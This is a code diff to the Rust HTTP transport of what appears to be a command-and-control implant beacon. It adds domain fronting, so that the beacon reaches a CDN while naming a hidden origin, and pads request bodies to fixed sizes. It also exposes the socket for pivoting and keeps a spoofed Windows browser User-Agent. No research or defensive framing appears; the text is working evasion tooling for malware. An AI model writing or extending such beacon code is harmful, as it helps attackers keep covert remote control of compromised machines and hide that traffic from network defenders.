@@ -7,8 +7,12 @@
 //!   reverse proxy or an HTTPS redirector for production).
 
 use std::io::{self, Read, Write};
-use std::net::{TcpStream, ToSocketAddrs};
+use std::net::ToSocketAddrs;
 use std::time::Duration;
+
+/// The socket type the channels use. It is re-exported so the pivot code can
+/// hand a connected socket over to another component.
+pub use std::net::TcpStream;
 
 pub trait Channel {
     fn write_frame(&mut self, frame: &[u8]) -> io::Result<()>;
@@ -21,6 +25,16 @@ pub trait Channel {
     /// HTTP transports record the session id here so later requests can be
     /// routed to the same server-side session.
     fn set_session_id(&mut self, _sid: &str) {}
+    /// The number of bytes that wait for the next request. The HTTP
+    /// transport uses it to pad a body to a bucket size.
+    fn pending_len(&self) -> usize {
+        0
+    }
+    /// Take the underlying socket, when the transport owns one. The pivot
+    /// callback uses it to keep the connection after the handshake.
+    fn take_stream(&mut self) -> Option<TcpStream> {
+        None
+    }
 }
 
 const CONNECT_TIMEOUT: Duration = Duration::from_secs(15);
@@ -98,6 +112,10 @@ pub struct HttpChannel {
     host: String,
     port: u16,
     path: String,
+    /// The Host header of the requests. It is empty for "host:port", and a
+    /// value for domain fronting: the beacon talks to a CDN while the
+    /// request still names the origin.
+    host_header: String,
     sid: Option<String>,
     out: Vec<u8>,
     pending: std::collections::VecDeque<Vec<u8>>,
@@ -109,7 +127,9 @@ pub struct HttpChannel {
 
 impl HttpChannel {
     /// `addr` is "host:port"; `path` defaults to /api/v1/beacon.
-    pub fn new(addr: &str, path: &str) -> io::Result<Self> {
+    /// `host_header` overrides the Host header (domain fronting); an empty
+    /// value means "host:port".
+    pub fn new(addr: &str, path: &str, host_header: &str) -> io::Result<Self> {
         let (host, port) = match addr.rsplit_once(':') {
             Some((h, p)) => (
                 h.to_string(),
@@ -122,6 +142,7 @@ impl HttpChannel {
             host,
             port,
             path: if path.is_empty() { "/api/v1/beacon".to_string() } else { path.to_string() },
+            host_header: host_header.to_string(),
             sid: None,
             out: Vec::new(),
             pending: std::collections::VecDeque::new(),
@@ -165,7 +186,14 @@ impl HttpChannel {
         let mut attempt = 0;
         let (status, payload) = loop {
             let mut stream = self.stream.take().expect("stream checked above");
-            let result = exchange(&mut stream, &target, &self.host, self.port, &body);
+            let result = exchange(
+                &mut stream,
+                &target,
+                &self.host,
+                &self.host_header,
+                self.port,
+                &body,
+            );
             match result {
                 Ok((status, payload, reusable)) => {
                     if reusable {
@@ -234,6 +262,10 @@ impl Channel for HttpChannel {
     fn set_session_id(&mut self, sid: &str) {
         self.sid = Some(sid.to_string());
     }
+
+    fn pending_len(&self) -> usize {
+        self.out.len()
+    }
 }
 
 /// Send one request on an open connection and read its response.
@@ -245,16 +277,23 @@ fn exchange(
     stream: &mut TcpStream,
     target: &str,
     host: &str,
+    host_header: &str,
     port: u16,
     body: &[u8],
 ) -> io::Result<(u16, Vec<u8>, bool)> {
+    // The Host header is either the configured one (domain fronting) or
+    // "host:port".
+    let host = if host_header.is_empty() {
+        format!("{host}:{port}")
+    } else {
+        host_header.to_string()
+    };
     let header = format!(
-        "POST {} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
+        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
          Content-Type: application/octet-stream\r\nContent-Length: {}\r\n\
          Connection: keep-alive\r\n\r\n",
         target,
         host,
-        port,
         body.len()
     );
     stream.write_all(header.as_bytes())?;
